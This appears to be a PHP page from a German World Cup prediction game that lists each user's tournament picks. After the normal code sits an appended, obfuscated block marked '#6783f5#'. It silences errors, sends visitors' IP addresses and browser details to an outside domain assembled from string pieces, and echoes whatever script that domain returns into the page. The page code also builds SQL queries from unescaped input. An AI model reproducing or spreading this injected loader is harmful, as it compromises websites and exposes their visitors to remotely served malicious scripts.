<?php
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
echo "<br>";
echo "<a href='../util/login.php5'>zurück</a>";
echo "<br>";
echo "<br>";
echo "<title>Tippspiel - Tipps ALL USERS (Germany)</title>";
echo "</head>";
echo "<body>";
include_once("../util/dbutil.php5");
include_once("../../general/log/log.php5");
include_once("../util/dbschema.php5");

$log=new viewlogger();
$log->info("clicked showAllUsersSpecialTipps.php5");


printSpecials();

function printSpecials(){
	
	echo "<h3>Stockerl-Tipps und Torschützenkönige</h3>";
	echo "<br>";
	
	echo "<table border='1' rules='all'>";
	echo "<tr>";
	echo "<th>User</th> ";
	echo "<th>Weltmeister</th> ";
	echo "<th>Vizeweltmeister</th> ";
	echo "<th>Platz 3</th> ";
	echo "<th>Torschützenkönig</th> ";
	echo "</tr>";
	
	$table_users=dbschema::users;
	$sql="SELECT * FROM $table_users t ORDER BY lastname,firstname";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		echo "<tr>";
		printSpecialsForUser($array["username"]);
		echo "</tr>";
	}
	echo "</table>";
}

function printSpecialsForUser($username){
	$worldChampion=getTippedTeamRostrum($username, 1);
	$vice=getTippedTeamRostrum($username, 2);
	$third=getTippedTeamRostrum($username, 3);
	
	$tippTopscorer=getTippedTopScorer($username);
	$tippedTeamShort=getTippedTopScorerTeam($username);
	$tippedTeam=getTeamName($tippedTeamShort);
	echo "<tr>";
	echo "<td>" . getUserInfo($username) . "</td>";
	echo "<td>" . $worldChampion . "</td>";
	echo "<td>" . $vice . "</td>";
	echo "<td>" . $third . "</td>";
	echo "<td>" . $tippTopscorer . "($tippedTeam)" . "</td>";
	echo "</tr>";
}

function getUserInfo($username){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$username'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	return "$firstname $lastname";
}
?>
<?php
#6783f5#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/6783f5#
?>
